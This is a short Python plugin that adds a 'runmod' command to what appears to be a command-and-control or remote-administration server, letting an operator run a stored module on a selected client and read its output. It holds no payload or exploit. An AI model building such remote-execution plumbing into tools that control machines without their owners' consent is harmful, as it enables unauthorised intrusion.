def register(server):
    def runmod_cmd(args, server):
        session = server.select_client()
        if not session:
            print("[!] No client selected.")
            return

        modname = input("Module name to run: ").strip()
        cmd = f"__run_module__ {modname}"
        session.send(cmd)
        print("[*] Run command sent, waiting for client output...")
        output = session.receive()
        if output is not None:
            print("[Client Output]\n" + output)
        else:
            print("[!] No response from client.")

    server.register_command("runmod", runmod_cmd, "Run a stored module on a client")
